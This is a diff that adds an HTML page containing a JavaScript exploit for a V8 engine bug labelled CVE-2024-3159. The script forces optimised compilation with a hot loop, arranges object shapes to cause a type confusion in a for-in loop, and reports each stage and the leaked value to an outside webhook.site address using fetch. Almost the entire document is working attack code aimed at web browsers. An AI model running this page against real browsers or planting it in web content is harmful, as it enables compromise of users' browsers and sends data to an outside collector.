@@ -1,0 +1,49 @@
+<html><body><script>
+// CVE-2024-3159 natives-free via OSR: hot loop inside trigger forces TF on call #1; fire on call #2
+const SINK = 'https://webhook.site/a02901c5-1463-4d49-8c93-b651b9c35595/';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
+}
+beacon('start', 'osr-variant');
+
+const object1 = {};
+object1.a = 1;
+const object2 = {};
+object2.a = 1;
+object2.b = 1;
+const object3 = {};
+object3.a = 1;
+object3.b = 1;
+object3.c = 1;
+Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
+const object4 = {};
+object4.a = 1;
+object4.b = 1;
+object4.c = 1;
+object4.d = 1;
+
+for (let key in object3) { }
+delete object3.d;
+
+let escape;
+function trigger(callback) {
+  var s = 0;
+  for (var i = 0; i < 200000; i++) s += i;   // OSR hot loop -> TF compiles trigger
+  for (let key in object2) {
+    callback();
+    escape = object2[key];
+  }
+  return s;
+}
+function benign() { }
+
+var r1 = trigger(benign);
+beacon('stage', 'osr-call1 r1=' + r1);
+
+beacon('pre-fire', 'armed');
+trigger(function () {
+  object4.c = 1.1;
+  for (let key in object1) { }
+});
+beacon('fired', 'escape=' + (typeof escape) + ':' + String(escape).slice(0,80));
+</script></body></html>
